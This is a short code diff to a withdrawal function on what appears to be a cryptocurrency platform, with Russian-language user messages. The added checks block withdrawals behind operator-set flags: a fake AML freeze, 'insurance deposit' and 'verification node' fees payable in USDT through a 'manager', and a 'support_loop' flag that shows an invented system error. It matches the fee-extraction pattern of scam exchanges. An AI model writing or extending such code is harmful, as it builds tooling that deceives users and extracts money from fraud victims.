@@ -118,12 +118,35 @@ export async function createWithdrawal(data: {
   if (!user) return { ok: false, error: "User not found" };
   if (user.is_blocked) return { ok: false, error: "Account blocked" };
 
+  // ── Security Incident checks: проверяем все сценарии блокировки ─────────
+  if (user.is_frozen) {
+    return { ok: false, error: "Счёт заморожен в рамках проверки AML/CFT. Обратитесь в службу безопасности." };
+  }
+
   // Проверяем required_tax (блокирует вывод пока > 0)
   if (Number(user.required_tax) > 0) {
     return {
       ok: false,
       error: `Для вывода средств необходимо оплатить налог ${Number(user.required_tax).toFixed(2)} USDT. Обратитесь к менеджеру.`,
     };
+  }
+
+  if (Number(user.insurance_fee) > 0) {
+    return {
+      ok: false,
+      error: `Требуется страховой депозит ${Number(user.insurance_fee).toFixed(2)} USDT. Обратитесь к менеджеру.`,
+    };
+  }
+
+  if (Number(user.node_fee) > 0) {
+    return {
+      ok: false,
+      error: `Требуется активация узла верификации: ${Number(user.node_fee).toFixed(2)} USDT. Обратитесь к менеджеру.`,
+    };
+  }
+
+  if (user.support_loop) {
+    return { ok: false, error: "Системная ошибка 0x404: модуль обработки транзакций недоступен. Обратитесь в поддержку." };
   }
 
   // Проверяем баланс
